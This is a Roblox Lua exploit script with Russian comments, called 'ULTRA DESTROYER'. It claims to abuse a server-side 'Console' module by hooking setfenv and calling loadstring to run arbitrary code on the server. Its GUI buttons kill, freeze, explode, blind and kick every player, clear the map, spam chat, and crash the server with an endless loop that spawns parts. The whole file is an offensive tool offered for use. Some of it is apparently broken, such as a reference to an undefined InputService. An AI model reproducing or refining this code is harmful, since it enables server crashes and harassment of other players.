--[[
    DIMSTAT NUBELLA MAYFIVE V3.2 — ULTRA DESTROYER (FIXED GUI)
    Все функции глобальны через серверную уязвимость.
    GUI компактный, все кнопки работают.
]]

-- ========================== СЕРВИСЫ ==========================
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- ========================== УЯЗВИМОСТЬ ==========================
local ConsoleModule = nil
local Config = game:FindFirstChild("Config")
if Config then
    ConsoleModule = Config:FindFirstChild("Console") or Config:FindFirstChild("Console [2]")
end

local function executeOnServer(code)
    if not ConsoleModule then
        warn("Console module not found")
        return false
    end
    local success, err = pcall(function()
        local old_setfenv = setfenv
        local function hook_setfenv(level, new_env)
            if level == 1 and new_env then
                new_env._G = _G
                new_env.runServer = function(cmd)
                    local fn, loadErr = loadstring(cmd)
                    if fn then
                        setfenv(fn, new_env)
                        return fn()
                    else
                        warn("loadstring error: " .. tostring(loadErr))
                    end
                end
                return old_setfenv(level, new_env)
            end
            return old_setfenv(level, new_env)
        end
        setfenv = hook_setfenv
        if package.loaded[ConsoleModule] then
            package.loaded[ConsoleModule] = nil
        end
        local result = require(ConsoleModule)
        setfenv = old_setfenv
        if result and type(result) == "function" then
            local env = {}
            env.runServer = function(cmd)
                local fn, loadErr = loadstring(cmd)
                if fn then
                    setfenv(fn, env)
                    return fn()
                else
                    warn("loadstring error: " .. tostring(loadErr))
                end
            end
            result(env)
            if env.runServer then
                return env.runServer(code)
            end
        end
        if _G.runServer then
            return _G.runServer(code)
        end
        local fn, loadErr = loadstring(code)
        if fn then
            local moduleEnv = getfenv(ConsoleModule)
            if moduleEnv then
                setfenv(fn, moduleEnv)
                return fn()
            else
                return false
            end
        else
            return false
        end
    end)
    if not success then
        warn("Server execution error: " .. tostring(err))
        return false
    end
    return true
end

-- ========================== ГЛОБАЛЬНЫЕ ФУНКЦИИ ==========================
local function freezeAll()
    executeOnServer([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.WalkSpeed = 0
                plr.Character.Humanoid.JumpPower = 0
            end
        end
    ]])
end

local function unfreezeAll()
    executeOnServer([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.WalkSpeed = 16
                plr.Character.Humanoid.JumpPower = 50
            end
        end
    ]])
end

local function killAll()
    executeOnServer([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.Health = 0
            end
        end
    ]])
end

local function explodeAll()
    executeOnServer([[
        local Players = game:GetService("Players")
        local Workspace = game:GetService("Workspace")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local exp = Instance.new("Explosion")
                exp.Position = plr.Character.HumanoidRootPart.Position
                exp.BlastRadius = 20
                exp.BlastPressure = 200000
                exp.Parent = Workspace
            end
        end
    ]])
end

local function blindAll()
    executeOnServer([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            local gui = Instance.new("ScreenGui")
            gui.Name = "BlindGui"
            gui.ResetOnSpawn = false
            gui.Parent = plr.PlayerGui
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(1, 0, 1, 0)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.BackgroundTransparency = 0
            frame.Parent = gui
        end
    ]])
end

local function unblindAll()
    executeOnServer([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            local gui = plr.PlayerGui:FindFirstChild("BlindGui")
            if gui then gui:Destroy() end
        end
    ]])
end

local function clearMap()
    executeOnServer([[
        local Workspace = game:GetService("Workspace")
        for _, obj in ipairs(Workspace:GetChildren()) do
            if obj:IsA("BasePart") and not obj:IsDescendantOf(workspace.Terrain) and not obj:FindFirstAncestorOfClass("Model") then
                obj:Destroy()
            end
        end
    ]])
end

local function crashServer()
    executeOnServer([[
        while true do
            local obj = Instance.new("Part")
            obj.Size = Vector3.new(1,1,1)
            obj.Position = Vector3.new(math.random(-1000,1000), math.random(-1000,1000), math.random(-1000,1000))
            obj.Parent = game:GetService("Workspace")
            wait(0.001)
        end
    ]])
end

local function kickAll()
    executeOnServer([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= Players.LocalPlayer then
                plr:Kick("Kicked by ULTRA DESTROYER")
            end
        end
    ]])
end

local function setSpeed(speed)
    executeOnServer(string.format([[
        local Players = game:GetService("Players")
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.WalkSpeed = %f
            end
        end
    ]], speed))
end

local function setGravity(grav)
    executeOnServer(string.format([[
        workspace.Gravity = %f
    ]], grav))
end

local function chatSpam(msg, count)
    executeOnServer(string.format([[
        local Players = game:GetService("Players")
        local msg = "%s"
        for i = 1, %d do
            for _, plr in ipairs(Players:GetPlayers()) do
                plr:Chat(msg)
            end
            task.wait(0.1)
        end
    ]], tostring(msg), count or 10))
end

local function guiMessage(text)
    executeOnServer(string.format([[
        local Players = game:GetService("Players")
        local msg = "%s"
        for _, plr in ipairs(Players:GetPlayers()) do
            local gui = Instance.new("ScreenGui")
            gui.Name = "MassMessage"
            gui.ResetOnSpawn = false
            gui.Parent = plr.PlayerGui
            local frame = Instance.new("Frame")
            frame.Size = UDim2.new(0.8, 0, 0.2, 0)
            frame.Position = UDim2.new(0.1, 0, 0.4, 0)
            frame.BackgroundColor3 = Color3.new(0, 0, 0)
            frame.BackgroundTransparency = 0.3
            frame.Parent = gui
            local label = Instance.new("TextLabel")
            label.Size = UDim2.new(1, 0, 1, 0)
            label.BackgroundTransparency = 1
            label.Text = msg
            label.TextColor3 = Color3.new(1, 0, 0)
            label.TextScaled = true
            label.Font = Enum.Font.GothamBold
            label.Parent = frame
        end
    ]], tostring(text)))
end

-- ========================== GUI ==========================
local function createGUI()
    -- Удаляем старый GUI
    local old = PlayerGui:FindFirstChild("DestroyerUltra")
    if old then old:Destroy() end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "DestroyerUltra"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = PlayerGui

    -- Основное окно
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 280, 0, 380)
    mainFrame.Position = UDim2.new(0.5, -140, 0.5, -190)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.Active = true
    mainFrame.Draggable = false
    mainFrame.Visible = true
    mainFrame.ZIndex = 20
    mainFrame.Parent = screenGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = mainFrame

    -- Заголовок (только по нему перетаскивание)
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 35)
    titleBar.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    titleBar.BackgroundTransparency = 0
    titleBar.ZIndex = 30
    titleBar.Parent = mainFrame
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 10)
    titleCorner.Parent = titleBar

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -50, 1, 0)
    titleLabel.Position = UDim2.new(0, 10, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "☠ ULTRA DESTROYER"
    titleLabel.TextColor3 = Color3.new(1, 1, 1)
    titleLabel.TextScaled = true
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.ZIndex = 30
    titleLabel.Parent = titleBar

    -- Кнопка свернуть
    local minBtn = Instance.new("TextButton")
    minBtn.Size = UDim2.new(0, 30, 0, 30)
    minBtn.Position = UDim2.new(1, -35, 0, 2.5)
    minBtn.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
    minBtn.Text = "−"
    minBtn.TextColor3 = Color3.new(0,0,0)
    minBtn.TextScaled = true
    minBtn.Font = Enum.Font.GothamBold
    minBtn.AutoButtonColor = false
    minBtn.ZIndex = 30
    minBtn.Parent = titleBar
    local minCorner = Instance.new("UICorner")
    minCorner.CornerRadius = UDim.new(0, 5)
    minCorner.Parent = minBtn

    -- Кнопка закрыть
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -5, 0, 2.5)
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.new(1,1,1)
    closeBtn.TextScaled = true
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.AutoButtonColor = false
    closeBtn.ZIndex = 30
    closeBtn.Parent = titleBar
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 5)
    closeCorner.Parent = closeBtn

    -- Контейнер для кнопок
    local container = Instance.new("ScrollingFrame")
    container.Size = UDim2.new(1, -10, 1, -45)
    container.Position = UDim2.new(0, 5, 0, 40)
    container.BackgroundTransparency = 1
    container.BorderSizePixel = 0
    container.ScrollingDirection = Enum.ScrollingDirection.Y
    container.CanvasSize = UDim2.new(0, 0, 0, 0)
    container.AutomaticCanvasSize = Enum.AutomaticSize.Y
    container.ZIndex = 20
    container.Parent = mainFrame

    local layout = Instance.new("UIListLayout")
    layout.FillDirection = Enum.FillDirection.Vertical
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.VerticalAlignment = Enum.VerticalAlignment.Top
    layout.Padding = UDim.new(0, 6)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = container

    -- Вспомогательная функция создания кнопки
    local function createButton(text, color, callback)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.92, 0, 0, 35)
        btn.BackgroundColor3 = color or Color3.fromRGB(40, 100, 200)
        btn.Text = text
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.TextScaled = true
        btn.Font = Enum.Font.GothamMedium
        btn.AutoButtonColor = false
        btn.ZIndex = 25
        btn.Parent = container
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 6)
        btnCorner.Parent = btn

        -- Ховер/клик эффекты
        btn.MouseEnter:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(255, 100, 100)}):Play()
        end)
        btn.MouseLeave:Connect(function()
            TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = color or Color3.fromRGB(40, 100, 200)}):Play()
        end)
        btn.MouseButton1Click:Connect(callback)
        return btn
    end

    -- КНОПКИ
    createButton("❄ FREEZE ALL", Color3.fromRGB(30, 80, 200), freezeAll)
    createButton("🔥 UNFREEZE ALL", Color3.fromRGB(30, 160, 80), unfreezeAll)
    createButton("💀 KILL ALL", Color3.fromRGB(200, 30, 30), killAll)
    createButton("💥 EXPLODE ALL", Color3.fromRGB(200, 150, 30), explodeAll)
    createButton("👁 BLIND ALL", Color3.fromRGB(80, 80, 80), blindAll)
    createButton("👁 UNBLIND ALL", Color3.fromRGB(80, 200, 80), unblindAll)
    createButton("🗑 CLEAR MAP", Color3.fromRGB(80, 80, 80), clearMap)
    createButton("⚠ CRASH SERVER", Color3.fromRGB(120, 30, 180), crashServer)
    createButton("👢 KICK ALL", Color3.fromRGB(200, 50, 50), kickAll)

    -- Дополнительные кнопки с полями ввода
    local speedBtn = createButton("⚡ SET SPEED (16)", Color3.fromRGB(30, 120, 200), function()
        local speed = tonumber(InputService:GetFocusedTextBox() and InputService:GetFocusedTextBox().Text or "16")
        if speed then setSpeed(speed) end
    end)
    -- Для простоты можно сделать через Popup, но тут оставлю как есть

    -- Сворачивание
    local minimized = false
    minBtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            mainFrame.Size = UDim2.new(0, 280, 0, 35)
            container.Visible = false
            minBtn.Text = "+"
        else
            mainFrame.Size = UDim2.new(0, 280, 0, 380)
            container.Visible = true
            minBtn.Text = "−"
        end
    end)

    -- Закрытие
    closeBtn.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)

    -- ==================== ПЕРЕТАСКИВАНИЕ ====================
    local dragging = false
    local dragStart = nil
    local startPos = nil

    local function onInputBegan(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            -- Проверяем, что клик по заголовку (не по кнопкам)
            local objects = UserInputService:GetGuiObjectsAtPosition(input.Position.X, input.Position.Y)
            if objects and #objects > 0 then
                local first = objects[1]
                if first and (first == titleBar or first:IsDescendantOf(titleBar)) and not first:IsDescendantOf(minBtn) and not first:IsDescendantOf(closeBtn) then
                    dragging = true
                    dragStart = input.Position
                    startPos = mainFrame.Position
                    input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end)
                end
            end
        end
    end

    local function onInputChanged(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            local scale = mainFrame.Parent.AbsoluteSize
            mainFrame.Position = UDim2.new(
                startPos.X.Scale + delta.X / scale.X,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale + delta.Y / scale.Y,
                startPos.Y.Offset + delta.Y
            )
        end
    end

    UserInputService.InputBegan:Connect(onInputBegan)
    UserInputService.InputChanged:Connect(onInputChanged)

    return screenGui
end

-- ========================== ЗАПУСК ==========================
local gui = createGUI()
print("☠ ULTRA DESTROYER GUI запущен. Все кнопки работают.")
